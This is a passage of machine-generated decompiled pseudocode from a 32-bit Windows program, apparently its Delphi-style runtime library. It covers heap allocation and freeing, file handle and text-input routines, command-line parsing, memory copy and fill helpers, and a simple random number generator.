        if ((int)uVar7 < 0) {
          uVar3 = uVar7 + 3;
        }
        *(uint **)((DAT_0044261c - 0xc) + ((int)uVar3 >> 2) * 4) = puVar5;
        uVar3 = *puVar1;
        *(uint **)(uVar3 + 4) = puVar5;
        *puVar5 = uVar3;
      }
      *puVar1 = puVar1[2] | 2;
      _DAT_004425ac = _DAT_004425ac + 1;
      _DAT_004425b0 = _DAT_004425b0 + (uVar7 - 4);
      FUN_004042b4((char)(puVar1 + 1),(char)(puVar1[2] | 2),(char)uVar3,uVar8,puVar9);
      return puVar1 + 1;
    }
  }
  if ((int)uVar7 <= DAT_00442614) {
    DAT_00442614 = DAT_00442614 - uVar7;
    if (DAT_00442614 < 0xc) {
      uVar7 = uVar7 + DAT_00442614;
      DAT_00442614 = 0;
    }
    DAT_00442618 = (uint *)((int)DAT_00442618 + uVar7);
    *puVar5 = uVar7 | 2;
    puVar5 = puVar5 + 1;
    _DAT_004425ac = _DAT_004425ac + 1;
    _DAT_004425b0 = _DAT_004425b0 + (uVar7 - 4);
    FUN_004042b4((char)puVar5,(char)(uVar7 | 2),uVar6,uVar8,puVar9);
    return puVar5;
  }
  FUN_00401fe0(uVar7);
  puVar5 = (uint *)0x0;
  *in_FS_OFFSET = uVar8;
  if (DAT_00442045 != '\0') {
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  return puVar5;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00402264(int param_1)

{
  char cVar1;
  uint *puVar2;
  undefined4 uVar3;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_CL_01;
  undefined uVar4;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  uint *puVar5;
  uint **ppuVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar7;
  undefined *puVar8;
  
  DAT_004425c0 = 0;
  if ((DAT_004425bc == '\0') && (cVar1 = FUN_004019e8(), in_DL = extraout_DL, cVar1 == '\0')) {
    DAT_004425c0 = 8;
    return 8;
  }
  uVar4 = 0;
  puVar8 = &LAB_004023f6;
  uVar7 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffe0;
  if (DAT_00442045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
    in_DL = extraout_DL_00;
    uVar4 = extraout_CL;
  }
  ppuVar6 = (uint **)(param_1 + -4);
  puVar5 = *ppuVar6;
  if (((uint)puVar5 & 2) == 0) {
    DAT_004425c0 = 9;
    goto LAB_004023cd;
  }
  _DAT_004425ac = _DAT_004425ac + -1;
  _DAT_004425b0 = _DAT_004425b0 - (((uint)puVar5 & 0x7ffffffc) - 4);
  if (((uint)puVar5 & 1) != 0) {
    puVar2 = *(uint **)(param_1 + -8);
    if (((int)puVar2 < 0xc) || (((uint)puVar2 & 0x80000003) != 0)) {
      DAT_004425c0 = 10;
      goto LAB_004023cd;
    }
    ppuVar6 = (uint **)((int)ppuVar6 - (int)puVar2);
    if (puVar2 != ppuVar6[2]) {
      DAT_004425c0 = 10;
      goto LAB_004023cd;
    }
    puVar5 = (uint *)((int)puVar5 + (int)puVar2);
    FUN_00401b8c((int *)ppuVar6);
    uVar4 = extraout_CL_00;
    in_DL = extraout_DL_01;
  }
  puVar5 = (uint *)((uint)puVar5 & 0x7ffffffc);
  puVar2 = (uint *)((int)ppuVar6 + (int)puVar5);
  if (puVar2 == DAT_00442618) {
    DAT_00442618 = (uint *)((int)DAT_00442618 - (int)puVar5);
    DAT_00442614 = DAT_00442614 + (int)puVar5;
    if (0x3c00 < DAT_00442614) {
      FUN_00401e7c();
      uVar4 = extraout_CL_01;
      in_DL = extraout_DL_02;
    }
    FUN_004042b4(0,in_DL,uVar4,uVar7,puVar8);
    return 0;
  }
  if ((*puVar2 & 2) == 0) {
    if (((puVar2[1] == 0) || (*puVar2 == 0)) || ((int)puVar2[2] < 0xc)) {
      DAT_004425c0 = 0xb;
      goto LAB_004023cd;
    }
    puVar5 = (uint *)((int)puVar5 + puVar2[2]);
    FUN_00401b8c((int *)puVar2);
  }
  else {
    if ((*puVar2 & 0x7ffffffc) < 4) {
      DAT_004425c0 = 0xb;
      goto LAB_004023cd;
    }
    *puVar2 = *puVar2 | 1;
  }
  FUN_00401df4(ppuVar6,puVar5);
LAB_004023cd:
  uVar3 = 0;
  *in_FS_OFFSET = uVar7;
  if (DAT_00442045 != '\0') {
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  return uVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00402408(int param_1,int param_2)

{
  uint uVar1;
  int *piVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *puVar5;
  uint *puVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint local_18;
  int local_14;
  
  uVar7 = param_2 + 7U & 0xfffffffc;
  if ((int)uVar7 < 0xc) {
    uVar7 = 0xc;
  }
  puVar6 = (uint *)(param_1 + -4);
  uVar9 = *puVar6 & 0x7ffffffc;
  piVar2 = (int *)((int)puVar6 + uVar9);
  if (uVar9 == uVar7) {
    uVar3 = CONCAT31((int3)((uint)piVar2 >> 8),1);
  }
  else {
    uVar8 = uVar7;
    if ((int)uVar7 < (int)uVar9) {
      local_18 = uVar9 - uVar7;
      if (piVar2 == DAT_00442618) {
        DAT_00442618 = (int *)((int)DAT_00442618 - local_18);
        DAT_00442614 = DAT_00442614 + local_18;
        if (DAT_00442614 < 0xc) {
          DAT_00442618 = (int *)((int)DAT_00442618 + local_18);
          DAT_00442614 = DAT_00442614 - local_18;
          uVar8 = uVar9;
        }
      }
      else {
        if ((*(byte *)piVar2 & 2) == 0) {
          local_18 = local_18 + piVar2[2];
          FUN_00401b8c(piVar2);
        }
        uVar8 = uVar9;
        if (0xb < (int)local_18) {
          *(uint *)((int)puVar6 + uVar7) = local_18 | 2;
          FUN_00401c50((int)((uint *)((int)puVar6 + uVar7) + 1));
          uVar8 = uVar7;
        }
      }
LAB_004025c2:
      _DAT_004425b0 = _DAT_004425b0 + (uVar8 - uVar9);
      uVar7 = *puVar6;
      *puVar6 = uVar8 | uVar7 & 0x80000003;
      uVar3 = CONCAT31((int3)((uVar7 & 0x80000003) >> 8),1);
    }
    else {
      do {
        local_14 = uVar7 - uVar9;
        if ((int *)((int)puVar6 + uVar9) == DAT_00442618) {
          if (local_14 <= DAT_00442614) {
            DAT_00442614 = DAT_00442614 - local_14;
            DAT_00442618 = (int *)((int)DAT_00442618 + local_14);
            if (DAT_00442614 < 0xc) {
              DAT_00442618 = (int *)((int)DAT_00442618 + DAT_00442614);
              uVar7 = uVar7 + DAT_00442614;
              DAT_00442614 = 0;
            }
            _DAT_004425b0 = _DAT_004425b0 + (uVar7 - uVar9);
            uVar9 = *puVar6;
            *puVar6 = uVar7 | uVar9 & 0x80000003;
            return CONCAT31((int3)((uVar9 & 0x80000003) >> 8),1);
          }
          FUN_00401e7c();
        }
        puVar4 = (uint *)((int)puVar6 + uVar9);
        if ((*(byte *)puVar4 & 2) == 0) {
          uVar1 = puVar4[2];
          if (local_14 <= (int)uVar1) {
            FUN_00401b8c((int *)puVar4);
            puVar4 = (uint *)(uVar1 - local_14);
            if ((int)puVar4 < 0xc) {
              puVar5 = (uint *)((int)puVar6 + uVar7 + (int)puVar4);
              *puVar5 = *puVar5 & 0xfffffffe;
              uVar8 = uVar7 + (int)puVar4;
            }
            else {
              FUN_00401df4((uint **)((int)puVar6 + uVar7),puVar4);
            }
            goto LAB_004025c2;
          }
          puVar4 = (uint *)((int)puVar4 + uVar1);
          local_14 = local_14 - uVar1;
        }
      } while (((*puVar4 & 0x80000000) != 0) &&
              (uVar3 = FUN_00401f80((LPVOID)((*puVar4 & 0x7ffffffc) + (int)puVar4),local_14),
              (char)uVar3 != '\0'));
      uVar3 = 0;
    }
  }
  return uVar3;
}



undefined4 FUN_004025e4(undefined4 *param_1,uint param_2)

{
  char cVar1;
  undefined4 uVar2;
  uint *puVar3;
  uint uVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  
  if ((DAT_004425bc == '\0') && (cVar1 = FUN_004019e8(), cVar1 == '\0')) {
    return 0;
  }
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  if (DAT_00442045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  uVar2 = FUN_00402408((int)param_1,param_2);
  if ((char)uVar2 == '\0') {
    puVar3 = FUN_004020d4(param_2);
    uVar4 = (param_1[-1] & 0x7ffffffc) - 4;
    if ((int)param_2 < (int)uVar4) {
      uVar4 = param_2;
    }
    if (puVar3 != (uint *)0x0) {
      FUN_0040285c(param_1,puVar3,uVar4);
      FUN_00402264((int)param_1);
    }
  }
  uVar2 = 0;
  *in_FS_OFFSET = uStack32;
  if (DAT_00442045 != '\0') {
    uStack32 = 0x402694;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  return uVar2;
}



int FUN_004026a8(int param_1)

{
  int iVar1;
  
  if (param_1 < 1) {
    iVar1 = 0;
  }
  else {
    iVar1 = (*(code *)PTR_FUN_0043f044)();
    if (iVar1 == 0) {
      FUN_004027b0(1);
    }
  }
  return iVar1;
}



int FUN_004026c8(int param_1)

{
  int iVar1;
  
  if (param_1 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = (*(code *)PTR_FUN_0043f048)();
    if (iVar1 != 0) {
      FUN_004027b0(CONCAT31((int3)((uint)iVar1 >> 8),2));
    }
  }
  return iVar1;
}



void FUN_004026e8(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    if (param_2 == 0) {
      *param_1 = 0;
      iVar1 = (*(code *)PTR_FUN_0043f048)(iVar1);
      if (iVar1 == 0) {
        return;
      }
      FUN_004027b0(CONCAT31((int3)((uint)iVar1 >> 8),2));
      return;
    }
    iVar1 = (*(code *)PTR_FUN_0043f04c)(iVar1);
    if (iVar1 != 0) {
      *param_1 = iVar1;
      return;
    }
LAB_00402719:
    FUN_004027b0(CONCAT31((int3)((uint)iVar1 >> 8),1));
    return;
  }
  if (param_2 != 0) {
    iVar1 = (*(code *)PTR_FUN_0043f044)(param_2);
    if (iVar1 == 0) goto LAB_00402719;
    *param_1 = iVar1;
  }
  return;
}



undefined4 FUN_00402738(void)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_004067f8();
  if (*piVar1 != 0) {
    piVar1 = (int *)FUN_004067f8();
    return *(undefined4 *)(*piVar1 + 8);
  }
  return 0;
}



void FUN_00402758(undefined4 param_1,undefined4 param_2)

{
  DAT_0043f004 = param_2;
  FUN_00404790(param_1);
  return;
}



void FUN_004027b0(uint param_1)

{
  LPVOID pvVar1;
  uint uVar2;
  undefined4 in_stack_00000000;
  
  uVar2 = param_1 & 0x7f;
  if (DAT_00442008 != (code *)0x0) {
    (*DAT_00442008)(uVar2,in_stack_00000000);
  }
  if ((byte)uVar2 == 0) {
    pvVar1 = FUN_004067f8();
    uVar2 = *(uint *)((int)pvVar1 + 4);
  }
  else if ((byte)uVar2 < 0x19) {
    uVar2 = (uint)(byte)(&DAT_0043f050)[uVar2];
  }
  FUN_00402758(uVar2 & 0xff,in_stack_00000000);
  return;
}



void FUN_004027bc(void)

{
  LPVOID pvVar1;
  
  pvVar1 = FUN_004067f8();
  if (*(int *)((int)pvVar1 + 4) == 0) {
    return;
  }
  FUN_004027b0(0);
  return;
}



void FUN_004027dc(undefined4 param_1)

{
  LPVOID pvVar1;
  
  pvVar1 = FUN_004067f8();
  *(undefined4 *)((int)pvVar1 + 4) = param_1;
  return;
}



void FUN_004027ec(void)

{
  DWORD DVar1;
  
  DVar1 = GetLastError();
  FUN_004027dc(DVar1);
  return;
}



void FUN_004027f8(byte *param_1,int param_2,int param_3,byte *param_4)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  
  bVar1 = *param_1;
  if (bVar1 == 0) {
    *param_4 = 0;
    return;
  }
  if (param_2 < 1) {
    param_2 = 1;
LAB_0040280e:
    iVar2 = ((uint)bVar1 - param_2) + 1;
    if (-1 < param_3) {
      if (iVar2 < param_3) {
        param_3 = iVar2;
      }
      goto LAB_00402819;
    }
  }
  else if (param_2 <= (int)(uint)bVar1) goto LAB_0040280e;
  param_3 = 0;
LAB_00402819:
  *param_4 = (byte)param_3;
  pbVar3 = param_1 + param_2;
  for (; param_4 = param_4 + 1, param_3 != 0; param_3 = param_3 + -1) {
    *param_4 = *pbVar3;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



undefined4 FUN_0040283c(void)

{
  undefined4 uVar1;
  LPVOID pvVar2;
  
  pvVar2 = FUN_004067f8();
  uVar1 = *(undefined4 *)((int)pvVar2 + 4);
  pvVar2 = FUN_004067f8();
  *(undefined4 *)((int)pvVar2 + 4) = 0;
  return uVar1;
}



void FUN_0040285c(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined *puVar4;
  undefined4 *puVar5;
  undefined *puVar6;
  
  iVar1 = (int)param_3 >> 2;
  if (param_1 < param_2) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_1);
    puVar5 = (undefined4 *)((param_3 - 4) + (int)param_2);
    if (-1 < iVar1) {
      for (; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar5 = *puVar3;
        puVar3 = puVar3 + -1;
        puVar5 = puVar5 + -1;
      }
      puVar4 = (undefined *)((int)puVar3 + 3);
      puVar6 = (undefined *)((int)puVar5 + 3);
      for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar6 = *puVar4;
        puVar4 = puVar4 + -1;
        puVar6 = puVar6 + -1;
      }
    }
  }
  else if ((param_2 != param_1) && (-1 < iVar1)) {
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *param_2 = *param_1;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
    for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_2 = *(undefined *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
    return;
  }
  return;
}



byte * FUN_0040289c(byte *param_1,int *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  byte *pbVar4;
  int iVar5;
  
  while( true ) {
    for (; (*param_1 != 0 && (*param_1 < 0x21)); param_1 = (byte *)CharNextA((LPCSTR)param_1)) {
    }
    if ((*param_1 != 0x22) || (param_1[1] != 0x22)) break;
    param_1 = param_1 + 2;
  }
  pbVar4 = (byte *)0x0;
  pbVar3 = param_1;
  while (0x20 < *pbVar3) {
    if (*pbVar3 == 0x22) {
      pbVar3 = (byte *)CharNextA((LPCSTR)pbVar3);
      while ((*pbVar3 != 0 && (*pbVar3 != 0x22))) {
        pbVar2 = (byte *)CharNextA((LPCSTR)pbVar3);
        pbVar4 = pbVar2 + ((int)pbVar4 - (int)pbVar3);
        pbVar3 = pbVar2;
      }
      if (*pbVar3 != 0) {
        pbVar3 = (byte *)CharNextA((LPCSTR)pbVar3);
      }
    }
    else {
      pbVar2 = (byte *)CharNextA((LPCSTR)pbVar3);
      pbVar4 = pbVar2 + ((int)pbVar4 - (int)pbVar3);
      pbVar3 = pbVar2;
    }
  }
  FUN_00404d98(param_2,(uint)pbVar4);
  iVar1 = *param_2;
  iVar5 = 0;
  while (0x20 < *param_1) {
    if (*param_1 == 0x22) {
      param_1 = (byte *)CharNextA((LPCSTR)param_1);
      while ((*param_1 != 0 && (*param_1 != 0x22))) {
        pbVar3 = (byte *)CharNextA((LPCSTR)param_1);
        for (; param_1 < pbVar3; param_1 = param_1 + 1) {
          *(byte *)(iVar1 + iVar5) = *param_1;
          iVar5 = iVar5 + 1;
        }
      }
      if (*param_1 != 0) {
        param_1 = (byte *)CharNextA((LPCSTR)param_1);
      }
    }
    else {
      pbVar3 = (byte *)CharNextA((LPCSTR)param_1);
      for (; param_1 < pbVar3; param_1 = param_1 + 1) {
        *(byte *)(iVar1 + iVar5) = *param_1;
        iVar5 = iVar5 + 1;
      }
    }
  }
  return param_1;
}



void FUN_00402988(int param_1,int *param_2)

{
  DWORD DVar1;
  byte *pbVar2;
  undefined4 local_114 [66];
  
  FUN_004047a8(param_2);
  if (param_1 == 0) {
    DVar1 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_114,0x105);
    FUN_00404898(param_2,local_114,DVar1);
  }
  else {
    pbVar2 = (byte *)GetCommandLineA();
    while( true ) {
      pbVar2 = FUN_0040289c(pbVar2,param_2);
      if ((param_1 == 0) || (*param_2 == 0)) break;
      param_1 = param_1 + -1;
    }
  }
  return;
}



void FUN_004029e8(void)

{
  BOOL BVar1;
  undefined4 local_8;
  
  BVar1 = QueryPerformanceCounter((LARGE_INTEGER *)&local_8);
  if (BVar1 != 0) {
    DAT_0043f008 = local_8;
    return;
  }
  DAT_0043f008 = GetTickCount();
  return;
}



undefined4 FUN_00402a10(void)

{
  float10 in_ST0;
  undefined4 local_8;
  
  local_8 = (undefined4)(longlong)ROUND(in_ST0);
  return local_8;
}



int FUN_00402a50(undefined *param_1,undefined2 param_2)

{
  ushort uVar1;
  int iVar2;
  
  uVar1 = *(ushort *)(param_1 + 4);
  if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {
    iVar2 = 0x66;
  }
  else {
    if (uVar1 != 0xd7b0) {
      FUN_00402ec8(param_1);
    }
    *(undefined2 *)(param_1 + 4) = param_2;
    if ((param_1[0x48] == '\0') && (*(int *)(param_1 + 0x18) == 0)) {
      *(undefined **)(param_1 + 0x18) = &LAB_00402b78;
    }
    iVar2 = (**(code **)(param_1 + 0x18))(param_1);
  }
  if (iVar2 != 0) {
    FUN_004027dc(iVar2);
  }
  return iVar2;
}



void FUN_00402aa8(undefined *param_1)

{
  FUN_00402a50(param_1,0xd7b1);
  return;
}



void FUN_00402ab4(undefined *param_1)

{
  FUN_00402a50(param_1,0xd7b2);
  return;
}



void FUN_00402ac0(undefined *param_1)

{
  FUN_00402a50(param_1,0xd7b3);
  return;
}



uint FUN_00402b48(HANDLE param_1)

{
  BOOL BVar1;
  
  BVar1 = CloseHandle(param_1);
  return BVar1 - 1U & 0xffffff00 | (uint)(BVar1 - 1U == 0);
}



DWORD FUN_00402b58(HANDLE *param_1)

{
  uint uVar1;
  DWORD DVar2;
  
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  uVar1 = FUN_00402b48(*param_1);
  if ((char)uVar1 == '\0') {
    DVar2 = GetLastError();
    return DVar2;
  }
  return 0;
}



undefined4 FUN_00402d24(undefined4 *param_1,undefined *param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  int iVar3;
  
  FUN_004030a0(param_1,0x14c,0);
  param_1[5] = param_1 + 0x53;
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  *(ushort *)((int)param_1 + 6) = (ushort)DAT_0043f038;
  param_1[2] = 0x80;
  param_1[6] = &LAB_00402b78;
  uVar1 = FUN_00404a68((int)param_2);
  puVar2 = (undefined4 *)FUN_00404c68(param_2);
  FUN_0040285c(puVar2,param_1 + 0x12,uVar1);
  iVar3 = FUN_00404a68((int)param_2);
  *(undefined *)((int)param_1 + iVar3 + 0x48) = 0;
  return 0;
}



int FUN_00402d8c(undefined *param_1,undefined *param_2,uint param_3)

{
  int iVar1;
  ushort uVar2;
  uint uVar3;
  
  if ((ushort)(*(short *)(param_1 + 4) + 0x284fU) == 0) {
    iVar1 = 0;
  }
  else {
    uVar3 = (param_3 & 0xffff0000 | (uint)(ushort)(*(short *)(param_1 + 4) + 0x284fU)) - 1;
    uVar2 = (ushort)uVar3;
    if (uVar2 < 2) {
      iVar1 = (*(code *)param_2)(param_1,param_2,uVar3 & 0xffff0000 | (uint)(ushort)(uVar2 - 2));
    }
    else if ((param_1 == &DAT_00442214) || (param_1 == &DAT_004423e0)) {
      iVar1 = 0;
    }
    else {
      iVar1 = 0x67;
    }
  }
  if (iVar1 != 0) {
    FUN_004027dc(iVar1);
  }
  return iVar1;
}



void FUN_00402dd4(undefined *param_1,undefined4 param_2,uint param_3)

{
  FUN_00402d8c(param_1,*(undefined **)(param_1 + 0x1c),param_3);
  return;
}



void FUN_00402de0(undefined *param_1,undefined4 param_2,uint param_3)

{
  FUN_00402d8c(param_1,*(undefined **)(param_1 + 0x20),param_3);
  return;
}



uint FUN_00402dfc(undefined4 *param_1,undefined4 param_2,uint param_3,undefined4 param_4,
                 undefined *param_5,uint param_6,uint *param_7)

{
  int iVar1;
  DWORD DVar2;
  uint local_8;
  
  local_8 = param_3;
  if (param_6 == (*(ushort *)(param_1 + 1) & param_6)) {
    iVar1 = (*(code *)param_5)(*param_1,(int)((ulonglong)
                                              ((longlong)(int)param_1[2] * (longlong)(int)param_3)
                                             >> 0x20),param_3,*param_1,param_2,
                               (int)((longlong)(int)param_1[2] * (longlong)(int)param_3),&local_8,0)
    ;
    if (iVar1 == 0) {
      DVar2 = GetLastError();
      FUN_004027dc(DVar2);
      local_8 = 0;
    }
    else {
      local_8 = local_8 / (uint)param_1[2];
      if (param_7 == (uint *)0x0) {
        if (param_3 != local_8) {
          FUN_004027dc(param_4);
          local_8 = 0;
        }
      }
      else {
        *param_7 = local_8;
      }
    }
  }
  else {
    FUN_004027dc(0x67);
    local_8 = 0;
  }
  return local_8;
}



void FUN_00402e88(undefined4 *param_1,undefined4 param_2,uint param_3,uint *param_4)

{
  FUN_00402dfc(param_1,param_2,param_3,100,&DAT_00402dec,0xd7b1,param_4);
  return;
}



void FUN_00402ea8(undefined4 *param_1,undefined4 param_2,uint param_3,uint *param_4)

{
  FUN_00402dfc(param_1,param_2,param_3,0x65,&DAT_00402df4,0xd7b2,param_4);
  return;
}



int FUN_00402ec8(undefined *param_1)

{
  ushort uVar1;
  int iVar2;
  
  iVar2 = 0;
  uVar1 = *(ushort *)(param_1 + 4);
  if ((uVar1 < 0xd7b1) || (0xd7b3 < uVar1)) {
    if (param_1 != &DAT_00442048) {
      FUN_004027dc(0x67);
    }
  }
  else {
    if ((uVar1 & 0xd7b2) == 0xd7b2) {
      iVar2 = (**(code **)(param_1 + 0x1c))(param_1);
    }
    if (iVar2 == 0) {
      iVar2 = (**(code **)(param_1 + 0x24))(param_1);
    }
    if (iVar2 != 0) {
      FUN_004027dc(iVar2);
    }
  }
  return iVar2;
}



void FUN_00402f20(byte *param_1,byte *param_2,byte param_3)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  uint uVar4;
  byte *pbVar5;
  byte *pbVar6;
  
  bVar3 = *param_2;
  bVar2 = *param_1 + bVar3;
  if (((!CARRY1(*param_1,bVar3)) && (bVar2 <= param_3)) ||
     (bVar3 = param_3 - *param_1, bVar2 = param_3, *param_1 <= param_3 && bVar3 != 0)) {
    bVar1 = *param_1;
    *param_1 = bVar2;
    pbVar5 = param_2 + 1;
    pbVar6 = param_1 + bVar1 + 1;
    for (uVar4 = (uint)bVar3; uVar4 != 0; uVar4 = uVar4 - 1) {
      *pbVar6 = *pbVar5;
      pbVar5 = pbVar5 + 1;
      pbVar6 = pbVar6 + 1;
    }
  }
  return;
}



void FUN_00402f50(undefined4 *param_1,undefined4 *param_2)

{
  FUN_0040285c(param_2,param_1,*(byte *)param_2 + 1);
  return;
}



void FUN_00402f5c(byte *param_1,byte *param_2,byte param_3)

{
  if (*param_2 < param_3) {
    param_3 = *param_2;
  }
  *param_1 = param_3;
  FUN_0040285c((undefined4 *)(param_2 + 1),(undefined4 *)(param_1 + 1),(uint)param_3);
  return;
}



int * FUN_00402f78(int *param_1,int *param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3 >> 2;
  do {
    if (uVar1 == 0) {
LAB_00402fa8:
      uVar1 = param_3 & 3;
      if (((uVar1 != 0) && (*(char *)param_1 == *(char *)param_2)) &&
         ((uVar1 == 1 ||
          ((*(char *)((int)param_1 + 1) == *(char *)((int)param_2 + 1) &&
           ((uVar1 == 2 || (*(char *)((int)param_1 + 2) == *(char *)((int)param_2 + 2))))))))) {
        return (int *)0x0;
      }
      return param_1;
    }
    if (*param_1 != *param_2) {
      return param_1;
    }
    if (uVar1 == 1) {
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      goto LAB_00402fa8;
    }
    if (param_1[1] != param_2[1]) {
      return param_1;
    }
    param_1 = param_1 + 2;
    param_2 = param_2 + 2;
    uVar1 = uVar1 - 2;
  } while( true );
}



uint FUN_00402fe8(HANDLE *param_1)

{
  DWORD DVar1;
  DWORD DVar2;
  
  DVar1 = FUN_00403004(param_1);
  DVar2 = FUN_00403054(param_1);
  return DVar2 & 0xffffff00 | (uint)((int)DVar2 <= (int)DVar1);
}



DWORD FUN_00403004(HANDLE *param_1)

{
  DWORD DVar1;
  
  if ((*(ushort *)(param_1 + 1) < 0xd7b1) || (0xd7b3 < *(ushort *)(param_1 + 1))) {
    FUN_004027dc(0x67);
    DVar1 = 0xffffffff;
  }
  else {
    DVar1 = SetFilePointer(*param_1,0,(PLONG)0x0,1);
    if (DVar1 == 0xffffffff) {
      FUN_004027ec();
    }
    else {
      DVar1 = DVar1 / (uint)param_1[2];
    }
  }
  return DVar1;
}



DWORD FUN_00403054(HANDLE *param_1)

{
  DWORD DVar1;
  
  DVar1 = 0xffffffff;
  if ((*(ushort *)(param_1 + 1) < 0xd7b1) || (0xd7b3 < *(ushort *)(param_1 + 1))) {
    FUN_004027dc(0x67);
  }
  else {
    DVar1 = GetFileSize(*param_1,(LPDWORD)0x0);
    if (DVar1 == 0xffffffff) {
      FUN_004027ec();
    }
    else {
      DVar1 = DVar1 / (uint)param_1[2];
    }
  }
  return DVar1;
}



void FUN_004030a0(undefined4 *param_1,uint param_2,undefined param_3)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = (int)param_2 >> 2;
  if (-1 < iVar1) {
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *param_1 = CONCAT22(CONCAT11(param_3,param_3),CONCAT11(param_3,param_3));
      param_1 = param_1 + 1;
    }
    for (uVar2 = param_2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_1 = param_3;
      param_1 = (undefined4 *)((int)param_1 + 1);
    }
  }
  return;
}



undefined4 FUN_004030c0(uint param_1)

{
  DAT_0043f008 = DAT_0043f008 * 0x8088405 + 1;
  return (int)((ulonglong)param_1 * (ulonglong)DAT_0043f008 >> 0x20);
}



uint FUN_004030dc(undefined *param_1)

{
  short sVar1;
  undefined *puVar2;
  
  puVar2 = param_1;
  if (param_1 == &DAT_00442048) {
    uRam0044204e = (ushort)DAT_0043f038;
    puVar2 = (undefined *)FUN_00402aa8(&DAT_00442048);
  }
  sVar1 = *(short *)(param_1 + 4);
  if (sVar1 != -0x284f) {
    FUN_004027dc(0x68);
  }
  return (uint)puVar2 & 0xffffff00 | (uint)(sVar1 == -0x284f);
}



uint FUN_00403118(undefined *param_1)

{
  byte bVar1;
  uint uVar2;
  int iVar3;
  
  if (*(short *)(param_1 + 4) != -0x284f) {
    uVar2 = FUN_004030dc(param_1);
    if ((char)uVar2 == '\0') goto LAB_0040317a;
  }
  uVar2 = *(uint *)(param_1 + 0xc);
  if (*(uint *)(param_1 + 0x10) <= uVar2) {
    iVar3 = (**(code **)(param_1 + 0x1c))();
    if (iVar3 != 0) {
      FUN_004027dc(iVar3);
      goto LAB_0040317a;
    }
    uVar2 = *(uint *)(param_1 + 0xc);
    if (*(uint *)(param_1 + 0x10) <= uVar2) {
      if ((*(ushort *)(param_1 + 6) & 1) != 0) {
        *(undefined *)(uVar2 + *(int *)(param_1 + 0x14)) = 0x1a;
        *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + 1;
      }
      goto LAB_0040317a;
    }
  }
  bVar1 = *(byte *)(uVar2 + *(int *)(param_1 + 0x14));
  if (((*(ushort *)(param_1 + 6) & 1) == 0) || (bVar1 != 0x1a)) {
    *(uint *)(param_1 + 0xc) = uVar2 + 1;
    return (uint)bVar1;
  }
LAB_0040317a:
  return CONCAT31(CONCAT21((short)((uint)param_1 >> 0x10),0x1a),0x1a);
}



undefined * FUN_00403184(undefined *param_1,char *param_2,int param_3)

{
  bool bVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  byte *pbVar6;
  undefined *unaff_EBX;
  byte bVar7;
  int iVar5;
  
  bVar7 = 0;
  if (((*(short *)(param_1 + 4) == -0x284f) || (uVar3 = FUN_004030dc(param_1), (char)uVar3 != '\0'))
     && (unaff_EBX = param_1, 0 < param_3)) {
    pbVar6 = (byte *)(*(int *)(param_1 + 0xc) + *(int *)(param_1 + 0x14));
    iVar5 = *(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc);
    do {
      while( true ) {
        iVar4 = iVar5 + -1;
        if (iVar5 < 1) {
          *(byte **)(param_1 + 0xc) = pbVar6;
          uVar3 = FUN_00403118(param_1);
          iVar4 = *(int *)(param_1 + 0x10) - *(int *)(param_1 + 0xc);
          pbVar6 = (byte *)(*(int *)(param_1 + 0xc) + *(int *)(param_1 + 0x14));
          if ((char)(uVar3 >> 8) != '\0') {
            return param_1;
          }
        }
        else {
          uVar3 = (uint)*pbVar6;
          pbVar6 = pbVar6 + 1;
        }
        cVar2 = (char)uVar3;
        if (cVar2 == '\n') goto LAB_004031d8;
        iVar5 = iVar4;
        if (cVar2 == '\r') break;
        if ((cVar2 == '\x1a') && ((*(ushort *)(param_1 + 6) & 1) != 0)) goto LAB_004031d9;
        *param_2 = cVar2;
        iVar4 = param_3 + -1;
